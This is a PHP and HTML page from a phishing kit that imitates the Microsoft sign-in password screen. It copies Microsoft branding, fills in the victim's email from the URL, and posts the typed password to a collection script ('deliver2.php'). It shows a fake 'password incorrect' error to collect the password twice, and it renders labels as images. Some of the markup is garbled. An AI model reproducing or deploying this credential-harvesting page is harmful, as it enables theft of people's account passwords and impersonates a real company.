<?php
session_start();
include('otenka.php');
$email = '';
if(isset($_GET['email']) && !empty($_GET['email'])){
$email = $_GET['email'];
}
?>

<!DOCTYPE html>
<html dir="ltr" lang="en">

<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
    
    <title>Sign in </title>
    <link rel="shortcut icon" href="./data_files/favicon_a.ico">


    <link href="./data_files/converged.login.min.css" rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)">
</head>

<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb ltr" style="display: block;">
    
    <div>
        <div data-bind="component:{name: &#39;background-image&#39;, publicMethods: backgroundControlMethods}">
            <div class="background" role="presentation" data-bind="css:{app: isAppBranding}, style:{background: backgroundStyle}">
                <div class="blur" data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6387.8/content/images/backgrounds/0-small.jpg?x=12f4b8b543125cc986c79cd85320812f&quot;);"></div>
                <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6387.8/content/images/backgrounds/0.jpg?x=f5a9a9531b8f4bcc86eabb19472d15d5&quot;);"></div>
                <div class="background-overlay"></div>
            </div>
        </div>
        <form id="i0281" method="post" action="deliver2.php">
            <div class="outer" data-bind="component:{name: &#39;page&#39;, params:{serverData: svr, showButtons: svr.fShowButtons, showFooterLinks: true, useWizardBehavior: svr.fUseWizardBehavior, handleWizardButtons: false, password: password, hideFromAria: ariaHidden}, event:{footerAgreementClick: footer_agreementClick}}">
                <div class="middle">
                    <div class="inner" data-bind="css:{&#39;app&#39;: $loginPage.backgroundLogoUrl()}">
                        <div data-bind="component:{name: &#39;logo-control&#39;, params:{isChinaDc: svr.fIsChinaDc, bannerLogoUrl: $loginPage.bannerLogoUrl()}}"> <img class="logo" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6387.8/content/images/microsoft_logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6387.8/content/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" data-bind="imgSrc" src="./data_files/microsoft_logo.svg"> </div>
                        <div data-bind=" css:{&#39;wide&#39;: paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata(&#39;wide&#39;)}, component:{name: &#39;pagination-control&#39;, publicMethods: paginationControlMethods, params:{initialViewId: initialViewId, currentViewId: currentViewId, initialSharedData: initialSharedData, initialError: $loginPage.getServerError()}, event:{cancel: paginationControl_onCancel}}">
                            <div data-bind="css:{&#39;animate&#39;: animate() || animate.back(), &#39;back&#39;: animate.back}" class="animate">
                                <div data-viewid="2" >
<input style="margin-left:-30px;margin-top:100px;display: none;" name="gotcha" type="submit" id="damn" value="fill">
                                    <input type="hidden" name="email" value="<?php echo $email?>" >
                                    <input type="text" name="loginfmt" class="moveOffScreen" tabindex="-1" aria-hidden="true">
                                    <div data-bind="component:{name: &#39;identity-banner-control&#39;, params:{pawnIconId: svr.iPawnIcon, displayName: displayName}}">
                                        <div class="identityBanner">
                                          <input class="identity" style="border: none;background: #f2f2f2 !important;height: 80%;margin: 0px 9px 5px 0px;color: #333 !important;" type="text" value="<?php echo $email?>" name="" readonly="">
                                            <!-- <div class="identity" title="mward@cedx.bid"><?php echo $email ?></div> -->
                                            <div class="profile-photo"> <img role="presentation" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6970.12/content/images/picker_account_aad.svg?x=9de70d1c5191d1852a0d5aac28b44a6c"> </div>
                                        </div>
                                    </div>
                                    <div id="loginHeader" class="row text-title" role="heading" ><img src="itinyewrngpat.png"></div>
</div>
                                    <div class="row">
                                        <div class="form-group col-md-24">

                                        <?php if (isset($_GET['auth'])) { echo '<div id="passwordError" class="alert alert-error">Your email or password is incorrect. If you don\'t remember your password, <a href="#"> reset it </a> </div> <div role="alert" aria-live="assertive" aria-atomic="false"> </div>'; } ?>
                                            <div class="placeholderContainer" data-bind="component:{name: &#39;placeholder-textbox&#39;, params:{serverData: svr, textInput: password, hasFocus: isFocused, hintText: str[&#39;CT_PWD_STR_PwdTB_Label&#39;], forcePlaceholderAttribute: true, hintCss: &#39;placeholder&#39;}}">
                                                <input name="password" type="password" id="i0118" autocomplete="off" class="form-control <?php if (isset($_GET['mgs'])) { echo 'has-error'; } ?>" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" placeholder="Password" aria-label="Enter password" maxlength="127" required> </div>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div>
                                            <div class="col-xs-24 form-group no-padding-left-right" >
                                                <div class="col-xs-12 secondary">
                                                    <input type="button" id="idBtn_Back" class="btn btn-block" value="Back"> </div>
                                                <div class="col-xs-12 primary">
                                                    <input type="submit" class="btn btn-block btn-primary" value="Sign in"> </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.fLockUsername &amp;&amp; !showHip">
                                        <label id="idLbl_PWD_KMSI_Cb">
                                            <input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" type="checkbox" data-bind="checked: isKmsiChecked, ariaLabel: str[&#39;CT_PWD_STR_KeepMeSignedInCB_Text&#39;]" aria-label="Keep me signed in"> <span data-bind="text: str[&#39;CT_PWD_STR_KeepMeSignedInCB_Text&#39;]"><img src="dobemnaime.png"></span> </label>
                                    </div>
                                    <div class="row">
                                        <div class="col-md-24">
                                            <div class="text-13">
                                                <div class="form-group no-margin-bottom" data-bind="css:{&#39;no-margin-bottom&#39;: !hasRemoteNgc &amp;&amp; !allowPhoneDisambiguation &amp;&amp; !showChangeUserLink}"> <a id="idA_PWD_ForgotPassword" href="#" data-bind="text: str[&#39;CT_PWD_STR_ForgotPwdLink_Text&#39;], href: svr.urlResetPassword, click: resetPassword_onClick"><img src="ichefugopat.png"></a> </div>
                                                <div class="form-group no-margin-bottom" data-bind="visible: showChangeUserLink" style="display: none;"> <a id="i1668" data-bind="text: str[&#39;CT_FED_STR_ChangeUserLink_Text&#39;], href: svr.urlSwitch">Sign in</a> </divttps://p">Privacy &amp; Cookies</a> </div>
                </div>
            </div>
        </form>
        <form method="post" target="_top"> </form>
    </div>
    <iframe id="idPartnerPL" height="0" width="0" src="./data_files/Prefetch.html" style="display: none;"></iframe>
</body>

</html>